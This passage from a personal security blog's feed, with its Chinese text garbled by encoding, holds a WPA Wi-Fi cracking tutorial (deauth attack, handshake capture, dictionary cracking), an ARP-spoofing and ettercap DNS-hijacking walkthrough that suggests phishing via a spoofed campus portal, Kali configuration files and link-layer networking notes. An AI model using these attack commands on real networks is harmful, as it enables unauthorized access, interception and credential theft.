çš„åŒ…-æ¡æ‰‹åŒ…ã€‚å½“æœ‰ç”¨æˆ·æ–­å¼€æˆ–è€…è¿æ¥wifiçš„æ—¶å€™ä¼šå‘é€æ¡æ‰‹åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 1 --bssid F0:B4:29:D2:3D:2A ~/ wlan0mon</span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜:</p><blockquote><p>-cæŒ‡å®šé¢‘é“å· -bssidæŒ‡å®šbssid -wæ•°æ®åŒ…ä¿å­˜çš„ä½ç½®</p></blockquote><figure><img src="/images/2018/07/Screenshot-from-2018-07-05-23-59-23.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="å¼ºåˆ¶æ–­è¿æ¥">å¼ºåˆ¶æ–­è¿æ¥</h3><p>è¿™ä¸ªæ—¶å€™åªè¦å»ç­‰å¾…ç”¨æˆ·é‡è¿å°±okäº†,ä¸è¿‡æˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡ç”¨ç®€å•çš„æ–¹æ³•,ä½¿ç”¨aireplay-ngçš„å‘ä¿¡å·å·¥å…·,å®ƒç»™wifiå‘ä¸€ä¸ªdeauth(åè®¤è¯åŒ…),è®©è®¾å¤‡æ–­å¼€è¿æ¥,ä¹‹åå®ƒè‡ªç„¶ä¼šé‡è¿,è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥æŠ“åˆ°æ¡æ‰‹åŒ…äº† ç»ˆç«¯å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a F0:B4:29:D2:3D:2A -c B0:E2:35:C4:29:BC wlan0mon</span><br></pre></td></tr></table></figure><p>å‚æ•°è§£é‡Š:</p><blockquote><p>-0å‘èµ·deauthenticationæ”»å‡» -aæŒ‡å®šbssid -cæŒ‡å®šæ–­å¼€çš„è®¾å¤‡</p></blockquote><p><img src="/images/2018/07/Screenshot-from-2018-07-06-00-02-17.png" alt="blacsheep" /> å¦‚æœæˆåŠŸçš„è¯,ç»ˆç«¯ä¼šæ˜¾ç¤ºä¸€ä¸ªWPA handshake: F0:B4:29:D2:3D:2A æŠ“å®Œäº†å°±å¯ä»¥æ¢å¤ç½‘å¡çš„ç›‘æ§æ¨¡å¼äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure><h3 id="å¼€å§‹ç ´è§£">å¼€å§‹ç ´è§£</h3><p>ç ´è§£wifiå¬çš„æœ€å¤šçš„,aircrack-ng</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap</span><br></pre></td></tr></table></figure><p>å‚æ•°è§£é‡Š:</p><blockquote><p>-a2è¡¨ç¤ºwpaæ¡æ‰‹åŒ… -bè¡¨ç¤ºbssid -wæŒ‡å®šå­—å…¸æ–‡ä»¶ æœ€åæ˜¯æŠ“çš„åŒ…</p></blockquote><p>ç­‰å¾…ç ´è§£å®Œæˆ,å°±ä¼šåœ¨ä¸­é—´æ˜¾ç¤ºKEY FOUND![wifi_pass_is_here] <img src="/images/2018/07/fix_final.png" alt="blacsheep" /> å‚è€ƒé“¾æ¥:<a href="http://topspeedsnail.com/kali-linux-crack-wifi-wpa/" title="http://topspeedsnail.com/kali-linux-crack-wifi-wpa/">http://topspeedsnail.com/kali-linux-crack-wifi-wpa/</a></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ez_arp</title>
      <link href="/2018/07/05/ez-arp/"/>
      <url>/2018/07/05/ez-arp/</url>
      
        <content type="html"><![CDATA[<p>ç®€å•çš„arp,ä¹‹å‰æœ‰ç”¨è¿‡,ä½†æ˜¯è€æ˜¯å¿˜,å°±ç®€å•è®°å½•ä¸‹å§,é¡ºä¾¿ä¸ºåé¢ä¸€ç¯‡æ–‡ç« çš„å­¦ä¹ åšé“ºå«</p><h3 id="arpspoof">arpspoof</h3><p>è¿™ä¸ªæ¯”è¾ƒç®€å•,payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.1.103 192.168.1.1</span><br></pre></td></tr></table></figure><p>è¿™æ ·åœ¨192.168.1.103æ›´æ–°arpè¡¨å¯»æ‰¾192.168.1.1çš„macåœ°å€çš„æ—¶å€™ä¼šè¢«æ”»å‡»æœºæ›¿æ¢æˆæ”»å‡»æœºçš„mac,å¦‚æœæ”»å‡»æœºä¸è¿›è¡Œè½¬å‘åˆ™ç›®æ ‡å°±ä¼šæ–­ç½‘</p><h3 id="ettercap">ettercap</h3><p>ç›´æ¥ä½¿ç”¨GUIå°±å¥½äº†,è™½ç„¶ä¸ç”¨GUIä¹Ÿè¡Œ,ä½†æ˜¯å‘½ä»¤æ¯”è¾ƒå¤æ‚,æˆ‘åæ­£æ˜¯è®°ä¸ä½,æˆ‘é€‰æ‹©GUI é¦–å…ˆè¦dnsæˆªå‡»çš„è¯è¿˜å¾—é…ä¸€ä¸‹æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br><span class="line"># è¿™é‡Œæˆ‘æ”¹æˆäº†</span><br><span class="line"># * A 192.168.1.104</span><br><span class="line"># * PTR 192.168.1.104</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G #è¿›å…¥guiç•Œé¢</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/Screenshot-from-2018-07-05-18-06-40.png" alt="blacsheep" /> é€‰æ‹©ä½¿ç”¨çš„ç½‘å¡ <img src="/images/2018/07/Screenshot-from-2018-07-05-18-06-48.png" alt="blacsheep" /> æ‰«ä¸€ä¸‹å±€åŸŸç½‘ip <img src="/images/2018/07/Screenshot-from-2018-07-05-18-07-01.png" alt="blacsheep" /> ç½‘å…³åŠ å…¥åˆ°target1,ç›®æ ‡åŠ åˆ°2 <img src="/images/2018/07/Screenshot-from-2018-07-05-18-07-14.png" alt="blacsheep" /> é€‰æ‹©sniff connection <img src="/images/2018/07/Screenshot-from-2018-07-05-18-07-22.png" alt="blacsheep" /> ç„¶åpluginsé‡Œé¢é€‰dns <img src="/images/2018/07/Screenshot-from-2018-07-05-18-07-43.png" alt="blacsheep" /> ç„¶åç›®æ ‡å°±è¢«dnsæˆªå‡»äº† <img src="/images/2018/07/1-2.jpg" alt="blacsheep" /> å½“ç„¶,æŠ“ç›®æ ‡çš„åŒ…ä¹Ÿæ˜¯å¯ä»¥çš„,çœ‹éœ€æ±‚å˜›. è¿™é‡Œç”¨çš„æ˜¯ä½ ç”µä¿¡æ¯é—¨æˆ·ç™»å½•ç‚¹...å¦‚æœæ„¿æ„èŠ±å¿ƒæ€çš„è¯,å¯ä»¥é€‰æ‹©æŠŠç‰¹å®šçš„ä½ ç”µçš„ç½‘ç«™è¿›è¡Œdnsæˆªå‡»,ç„¶åè‡ªå·±æ­ä¸€ä¸ªç«™,å®ç°ç±»ä¼¼åŠŸèƒ½,ç„¶åæŒ‚åˆ°æŸäº›å…¬å…±åœºåˆé’“é±¼..</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kaliçš„ä¸€äº›åŸºæœ¬é…ç½®</title>
      <link href="/2018/07/04/kali%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/07/04/kali%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>ä¸€äº›ä¸ªäººä½¿ç”¨çš„é…ç½®å§,æ–¹ä¾¿ä»¥åè‡ªå·±é…</p><h3 id="tmux">tmux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Send prefix </span><br><span class="line">set-option -g prefix C-a </span><br><span class="line">unbind-key C-a </span><br><span class="line">bind-key C-a send-prefix </span><br><span class="line"></span><br><span class="line"># Use Alt-arrow keys to switch panes </span><br><span class="line">bind -n M-Left select-pane -L </span><br><span class="line">bind -n M-Right select-pane -R </span><br><span class="line">bind -n M-Up select-pane -U </span><br><span class="line">bind -n M-Down select-pane -D </span><br><span class="line"></span><br><span class="line"># Shift arrow to switch windows </span><br><span class="line">bind -n S-Left previous-window </span><br><span class="line">bind -n S-Right next-window </span><br><span class="line"></span><br><span class="line"># Mouse mode </span><br><span class="line">set -g mouse on </span><br><span class="line"></span><br><span class="line"># Set easier window split keys </span><br><span class="line">bind-key v split-window -h </span><br><span class="line">bind-key h split-window -v </span><br><span class="line"></span><br><span class="line"># Easy config reload </span><br><span class="line">bind-key r source-file ~/.tmux.conf \; display-message &quot;tmux.conf reloaded&quot;</span><br></pre></td></tr></table></figure><h3 id="vim">vim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">syntax on           &quot; è¯­æ³•é«˜äº®</span><br><span class="line">autocmd InsertLeave * se nocul  &quot; ç”¨æµ…è‰²é«˜äº®å½“å‰è¡Œ</span><br><span class="line">autocmd InsertEnter * se cul    &quot; ç”¨æµ…è‰²é«˜äº®å½“å‰è¡Œ</span><br><span class="line">set ruler           &quot; æ˜¾ç¤ºæ ‡å°º</span><br><span class="line">set showcmd         &quot; è¾“å…¥çš„å‘½ä»¤æ˜¾ç¤ºå‡ºæ¥ï¼Œçœ‹çš„æ¸…æ¥šäº›</span><br><span class="line">&quot;è‡ªåŠ¨ä¿å­˜</span><br><span class="line">set autowrite</span><br><span class="line">set ruler                   &quot; æ‰“å¼€çŠ¶æ€æ æ ‡å°º</span><br><span class="line">set cursorline              &quot; çªå‡ºæ˜¾ç¤ºå½“å‰è¡Œ</span><br><span class="line">set magic                   &quot; è®¾ç½®é­”æœ¯</span><br><span class="line">set guioptions-=T           &quot; éšè—å·¥å…·æ </span><br><span class="line">set guioptions-=m           &quot; éšè—èœå•æ </span><br><span class="line">&quot; ä¸è¦ä½¿ç”¨viçš„é”®ç›˜æ¨¡å¼ï¼Œè€Œæ˜¯vimè‡ªå·±çš„</span><br><span class="line">set nocompatible</span><br><span class="line">&quot; å»æ‰è¾“å…¥é”™è¯¯çš„æç¤ºå£°éŸ³</span><br><span class="line">set noeb</span><br><span class="line">&quot; åœ¨å¤„ç†æœªä¿å­˜æˆ–åªè¯»æ–‡ä»¶çš„æ—¶å€™ï¼Œå¼¹å‡ºç¡®è®¤</span><br><span class="line">set confirm</span><br><span class="line">&quot; è‡ªåŠ¨ç¼©è¿›</span><br><span class="line">set autoindent</span><br><span class="line">set cindent</span><br><span class="line">&quot; Tabé”®çš„å®½åº¦</span><br><span class="line">set tabstop=4</span><br><span class="line">&quot; ç»Ÿä¸€ç¼©è¿›ä¸º4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">&quot; ä¸è¦ç”¨ç©ºæ ¼ä»£æ›¿åˆ¶è¡¨ç¬¦</span><br><span class="line">set noexpandtab</span><br><span class="line">&quot; åœ¨è¡Œå’Œæ®µå¼€å§‹å¤„ä½¿ç”¨åˆ¶è¡¨ç¬¦</span><br><span class="line">set smarttab</span><br><span class="line">&quot; æ˜¾ç¤ºè¡Œå·</span><br><span class="line">set number</span><br><span class="line">&quot; å†å²è®°å½•æ•°</span><br><span class="line">set history=1000</span><br><span class="line">&quot;ç¦æ­¢ç”Ÿæˆä¸´æ—¶æ–‡ä»¶</span><br><span class="line">set nobackup</span><br><span class="line">set noswapfile</span><br><span class="line">&quot;æœç´¢å¿½ç•¥å¤§å°å†™</span><br><span class="line">set ignorecase</span><br><span class="line">&quot;æœç´¢é€å­—ç¬¦é«˜äº®</span><br><span class="line">set hlsearch</span><br><span class="line">set incsearch</span><br></pre></td></tr></table></figure><h3 id="sources.list">sources.list</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#ä¸­ç§‘å¤§</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#é˜¿é‡Œäº‘</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#æ¸…åå¤§å­¦</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#æµ™å¤§</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#å®˜æ–¹æº</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><h3 id="è£…docker">è£…docker</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D;</span><br><span class="line">echo &#x27;deb https://apt.dockerproject.org/repo debian-stretch main&#x27; &gt; /etc/apt/sources.list.d/docker.list;</span><br><span class="line">apt-get install apt-transport-https ca-certificates;</span><br><span class="line">apt-get update &amp;&amp; sudo apt-get install docker-engine;</span><br><span class="line">systemctl start docker;</span><br><span class="line">systemctl enable docker;</span><br><span class="line">systemctl status docker;</span><br><span class="line">exit;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="alias">alias</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># å¼€èšå‰‘</span><br><span class="line">alias ant=&#x27;cd /home/blacsheep/Tools/antSword-1.3-dev;npm start&#x27;</span><br><span class="line"></span><br><span class="line"># æ€è¿›ç¨‹</span><br><span class="line">alias mykill=&#x27;read temp;ps -aux  grep -v grep  grep $temp  cut -c 9-15  xargs kill&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç½‘å¤ä¹ (é“¾è·¯å±‚)</title>
      <link href="/2018/07/03/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2018/07/03/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h2 id="äº”.æ•°æ®é“¾è·¯å±‚">äº”.æ•°æ®é“¾è·¯å±‚</h2><h3 id="æ¦‚è¿°">æ¦‚è¿°</h3><p><strong>ç›®çš„</strong>:äº†è§£æ•°æ®é“¾è·¯å±‚æœåŠ¡å’Œåè®®åŸç† <strong>åŒ…æ‹¬</strong>: (1)å·®é”™æ£€æµ‹å’Œçº é”™ (2)å…±äº«å¹¿æ’­ä¿¡é“:å¤šè·¯è®¿é—®åè®® (3)é“¾è·¯å±‚å¯»å€ (4)å¯é ä¼ è¾“,æµé‡æ§åˆ¶ <strong>ç®€å•çš„ä»‹ç»</strong> <strong>æœ¯è¯­</strong>: èŠ‚ç‚¹:ä¸»æœºå’Œè·¯ç”±å™¨(åŒ…æ‹¬ç½‘æ¡¥å’Œäº¤æ¢æœº) é“¾è·¯:æ²¿é€šä¿¡è·¯å¾„è¿æ¥çš„é€šä¿¡ä¿¡é“ <strong>å¸§</strong>:é“¾è·¯å±‚åè®®äº¤æ¢çš„æ•°æ®å•å…ƒã€‚å°è£…ç½‘ç»œå±‚æ•°æ®æŠ¥</p><blockquote><p>æ•°æ®é“¾è·¯å±‚çš„èŒè´£: å°†åˆ†ç»„é€šè¿‡ä¸€ä¸ªé“¾è·¯,ä»ä¸€ä¸ªèŠ‚ç‚¹ä¼ åˆ°ä¸´è¿‘çš„å¦ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p></blockquote><p><strong>ç‰¹ç‚¹</strong>: åˆ†ç»„çš„ä¼ è¾“åœ¨ç»è¿‡ä¸åŒé“¾è·¯çš„æ—¶å€™å¯ä»¥ç”¨ä¸åŒçš„åè®®æ¥å®ç°</p><blockquote><p>ä¾‹å¦‚,æœ€åˆæ˜¯ä»¥å¤ªç½‘,ç„¶åæ˜¯å¸§ä¸­ç»§,æ¥ç€æ˜¯802.11</p></blockquote><p>æ¯ä¸ªé“¾è·¯åè®®æä¾›ä¸åŒæœåŠ¡</p><blockquote><p>ä¾‹å¦‚,å¯ä»¥åœ¨é“¾è·¯ä¸Šæä¾›æˆ–ä¸æä¾›å¯é çš„ä¼ è¾“</p></blockquote><h3 id="é“¾è·¯å±‚æœåŠ¡">é“¾è·¯å±‚æœåŠ¡</h3><p><strong>æˆå¸§</strong>: (1)æŠŠç½‘ç»œå±‚çš„æ•°æ®åŠ å¤´å’Œå°¾å°è£…æˆå¸§ (2)å¸§å¤´ä¸­åŒ…æ‹¬æŒ‡æ˜ç›®çš„å’Œæºçš„"ç‰©ç†åœ°å€"(ä¸åŒäºIPåœ°å€) <strong>é“¾è·¯è®¿é—®</strong>: (1)åª’ä½“è®¿é—®æ§åˆ¶åè®®(MAC) (2)å…±äº«åª’ä½“çš„å¤šè·¯è®¿é—® <strong>åœ¨é‚»æ¥èŠ‚ç‚¹é—´çš„å¯é ä¼ è¾“</strong>: (1)æ— ç¡®è®¤æ— è¿æ¥ (2)æ— ç¡®è®¤æœ‰è¿æ¥ (3)æœ‰ç¡®è®¤æœ‰è¿æ¥ <strong>å·®é”™æ£€æµ‹</strong>: å·®é”™ç”±ä¿¡å·è¡°å‡å’Œå™ªå£°æ‰€å¼•èµ· å¦‚æœæ¥å—è€…æ£€æµ‹åˆ°é”™è¯¯,é‚£ä¹ˆå‘é€è€…é‡ä¼ å¸§æˆ–è€…ä¸¢å¼ƒå¸§ <strong>çº é”™</strong>: æ¥æ”¶è€…æ£€æµ‹å’Œçº æ­£é”™è¯¯,ä¸éœ€è¦å‘é€è€…é‡ä¼ ã€‚</p><h3 id="å¤šè·¯è®¿é—®åè®®macåè®®">å¤šè·¯è®¿é—®åè®®(MACåè®®)</h3><p>åˆ†ä¸‰ç±»:</p><blockquote><p><strong>1.ä¿¡é“åˆ’åˆ†</strong> æŠŠä¿¡é“è¿›è¡Œåˆ’åˆ†(TDMA,FDMA,CDMA),ç„¶åç»™èŠ‚ç‚¹åˆ†é…ä¸“ç”¨çš„å°ç‰‡ <strong>2.éšæœºè®¿é—®</strong> ä¸åˆ’åˆ†ä¿¡é“,å…è®¸å†²çª,èƒ½å¤Ÿä»å†²çªä¸­"è¿›è¡Œæ¢å¤" <strong>3.è½®æµ</strong> é€šè¿‡é›†ä¸­æ¥è°ƒæ•´å…±äº«è®¿é—®ä»è€Œé¿å…å†²çª</p></blockquote><p>å…·ä½“æ¥çœ‹:</p><h4 id="ä¿¡é“åˆ’åˆ†">ä¿¡é“åˆ’åˆ†</h4><p><strong>TDMA</strong>:é€šè¿‡å¯¹ä¿¡é“è¿›è¡Œæ—¶éš™çš„åˆ’åˆ†,è½®æµè®¿é—®ä¿¡é“ã€‚ ä¸ªäººç†è§£TDMAæ˜¯ä¸€ç§ä¸²è¡Œä½¿ç”¨,å¯¹æ—¶é—´åˆ’åˆ†çš„è¯åˆ©ç”¨æ•ˆç‡å…¶å®å¾ˆä½... <strong>FDMA</strong>:ä¿¡é“æ ¹æ®é¢‘æ®µæ¥è¿›è¡Œåˆ’åˆ†,æ¯ä¸ªç«™ç‚¹åˆ†é…ä¸€ä¸ªå›ºå®šçš„é¢‘æ®µ,æœªè¢«ä½¿ç”¨çš„é¢‘æ®µç©ºé—²ã€‚ <strong>CDMA</strong>:æ¯ä¸ªèŠ‚ç‚¹åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„ç¼–ç ,æ¯ä¸ªèŠ‚ç‚¹ç”¨å…¶å”¯ä¸€çš„ç¼–ç æ¥å¯¹å‘é€çš„æ•°æ®è¿›è¡Œç¼–ç ,è¿™æ ·å¯ä»¥å®ç°å¤šä¸ªèŠ‚ç‚¹å…±å­˜,ä¿¡å·å¯ä»¥å åŠ ,å¯ä»¥åŒæ­¥ä¼ è¾“è€Œæ— å†²çª(å¦‚æœç¼–ç æ­£äº¤åŒ–)</p><h4 id="éšæœºè®¿é—®">éšæœºè®¿é—®</h4><p>èŠ‚ç‚¹ä»¥æ»¡æ•°æ®ç‡å‘é€æ•°æ®åŒ…,èŠ‚ç‚¹ä¹‹é—´æ²¡æœ‰åè°ƒè€…,å½“æœ‰2ä¸ªæˆ–æ›´å¤šçš„å‘é€èŠ‚ç‚¹çš„æ—¶å€™ä¼šå‘ç”Ÿå†²çª. æ‰€ä»¥éšæœºè®¿é—®MACåè®®è¿˜è¦æ±‚èƒ½å¤Ÿæ£€æµ‹å†²çªå¹¶ä¸”èƒ½å¤Ÿä»å†²çªä¸­æ¢å¤(æ¯”å¦‚é€šè¿‡å»¶æ—¶é‡ä¼ )ã€‚ éšæœºè®¿é—®MACåè®®çš„å®ä¾‹:</p><ul><li>ALOHA</li><li>æ—¶éš™ALOHA</li><li>CSMA,CSMA/CD,CSMA/CA</li></ul><p><strong>ALOHA(éæ—¶éš™):</strong> ç®€å•,ä¸éœ€è¦åŒæ­¥,å¸§ä¸€åˆ°è¾¾ç«‹å³ä¼ è¾“ ä½†æ˜¯t0å‘é€çš„å¸§ä¼šå’Œ[t0-1,t0+1]çš„å‘é€çš„å…¶å®ƒå¸§å†²çª åå‡ºç°çš„å¸§ä¼šè¦†ç›–å‰é¢å‡ºç°çš„,æ‰€ä»¥ä¼ è¾“æˆåŠŸæ¦‚ç‡ä¸º P=p(1-p)<sup>2(N-1)</sup> <strong>æ—¶éš™ALOHA:</strong> å‡è®¾æƒ…å†µ: æ‰€æœ‰çš„å¸§å¤§å°ç›¸åŒ;æ—¶é—´è¢«åˆ’åˆ†ç§°ä¸ºç›¸åŒå¤§å°çš„æ—¶éš™;ä¸€ä¸ªæ—¶éš™ç­‰äºä¼ é€ä¸€å¸§çš„æ—¶é—´;æ‰€æœ‰èŠ‚ç‚¹åªæœ‰åœ¨ä¸€ä¸ªæ—¶éš™å¼€å§‹çš„æ—¶å€™æ‰èƒ½ä¼ é€;èŠ‚ç‚¹éœ€è¦åŒæ­¥;å¦‚æœä¸€ä¸ªæ—¶éš™æœ‰å¤šä¸ªèŠ‚ç‚¹åŒæ—¶ä¼ é€,æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯ä»¥æ£€æµ‹åˆ°å†²çª å®ç°: èŠ‚ç‚¹å‘é€æ–°å¸§çš„æ—¶å€™ç­‰ä¸‹ä¸€ä¸ªæ—¶éš™å¼€å§‹ å¦‚æœæ²¡æœ‰å†²çª,èŠ‚ç‚¹å¯ä»¥åœ¨ä¸‹ä¸€ä¸ªæ—¶éš™å‘é€æ–°å¸§ å¦‚æœæœ‰å†²çª,èŠ‚ç‚¹åœ¨éšåçš„æ—¶éš™ä»¥æ¦‚ç‡pé‡ä¼ ,ç›´åˆ°æˆåŠŸ ä¼˜ç‚¹:</p><blockquote><p>1.å•ä¸ªæ´»è·ƒèŠ‚ç‚¹æ»¡é€Ÿç‡ä¼ é€å¸§ 2.é«˜åˆ†æ•£æ€§,åªç”¨èŠ‚ç‚¹æ—¶éš™åŒæ­¥ 3.ç®€å•</p></blockquote><p>ç¼ºç‚¹:</p><blockquote><p>1.å†²çª,æµªè´¹æ—¶éš™ 2.ç©ºé—²æ—¶éš™ 3.èŠ‚ç‚¹åªæœ‰åœ¨ä¼ è¾“æ•°æ®åŒ…çš„æ—¶å€™æ‰èƒ½æ£€æµ‹åˆ°å†²çª</p></blockquote><p><img src="/images/2018/07/1-1.jpg" alt="blacsheep" /> <strong>CSMA</strong> å¯ä»¥ç±»æ¯”äººç±»çš„ä¸æ‰“æ–­ä»–äºº å³ä¼ é€ä¹‹å‰ä¾¦å¬,å¦‚æœä¿¡é“ç©ºé—²åˆ™ä¼ è¾“,å¦åˆ™å»¶æ—¶ä¼ è¾“</p><blockquote><p>å†²çªå¯èƒ½: ä¼ æ’­å»¶æ—¶å¯èƒ½å¯¼è‡´ä¸¤ä¸ªèŠ‚ç‚¹æ²¡ä¾¦å¬åˆ°å…¶å®ƒèŠ‚ç‚¹çš„ä¼ é€ã€‚å½“å‘ç”Ÿå†²çªçš„æ—¶å€™,æ•´ä¸ªæ•°æ®åŒ…ä¼ é€æ—¶é—´è¢«æµªè´¹ã€‚å†²çªæ¦‚ç‡ç”±è·ç¦»å’Œä¼ æ’­å»¶æ—¶å†³å®š</p></blockquote><p><strong>CSMA/CD</strong> åŸºæœ¬æ€æƒ³: å½“ä¸€ä¸ªèŠ‚ç‚¹è¦å‘é€æ•°æ®çš„æ—¶å€™,å…ˆçœ‹æ˜¯å¦æœ‰è½½æ³¢ å¦‚æœæ²¡æœ‰,åˆ™å‘é€æ•°æ®,å¦åˆ™ç»§ç»­ç›‘å¬,ä¸€æ—¦å‘ç°ç©ºé—²å°±ç«‹åˆ»ä¼ é€æ•°æ®ã€‚ å¦‚æœå‘é€ä¸­æ²¡æœ‰å‘ç”Ÿå†²çª,åˆ™ä¼ è¾“æˆåŠŸ,å¦åˆ™åœæ­¢æ­£å¸¸å‘é€,è½¬è€Œå‘é€ä¸€çŸ­æš‚çš„å¹²æ‰°ä¿¡å·å¼ºåŒ–å†²çª,è®©å…¶ä»–ç«™ç‚¹éƒ½çŸ¥é“å‡ºç°äº†å†²çªã€‚ på‘é€äº†å¹²æ‰°ä¿¡å·åï¼ŒæŒ‡æ•°é€€é¿ä¸€éšæœºæ—¶é—´,å³å‡è®¾è¯¥å¸§ç»è¿‡næ¬¡å†²çªåï¼Œé€‚é…å™¨åœ¨{0,1,2,â€¦,2<sup>m</sup>-1}ä¸­éšæœºé€‰å–ä¸€ä¸ªKå€¼ ï¼Œå…¶ä¸­m=min(n,10),ç„¶åç­‰å¾…K*512æ¯”ç‰¹æ—¶é—´å,å›åˆ°ç¬¬2æ­¥</p><h4 id="è½®è½¬åè®®">è½®è½¬åè®®</h4><p>ä¸¤è€…çš„æŠ˜ä¸­,ä¸»èŠ‚ç‚¹è½®æµé‚€è¯·ä»å±èŠ‚ç‚¹æ¥ä¼ é€æ•°æ® 